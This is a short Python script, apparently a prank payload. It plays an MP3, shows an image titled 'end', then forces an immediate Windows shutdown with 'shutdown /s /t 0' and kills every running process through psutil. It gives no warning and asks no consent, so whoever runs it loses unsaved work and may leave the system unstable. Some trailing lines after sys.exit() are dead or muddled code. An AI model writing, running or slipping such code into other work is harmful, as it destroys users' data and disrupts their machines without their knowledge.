import sys  # to access the system
import cv2
from time import sleep
import psutil
import os
import pyglet

img = cv2.imread("ancient-rus.jpg", cv2.IMREAD_ANYCOLOR)

audio = pyglet.resource.media("slavyan-break.mp3")
audio.play()

sleep(14)

cv2.imshow("end", img)
cv2.waitKey(5000)
os.system("shutdown /s /t 0")
for proc in psutil.process_iter():
    proc.kill()
sys.exit()  # to exit from all the processes

cv2.destroyAllWindows()  # destroy all windows
pyglet.app.run(exit())

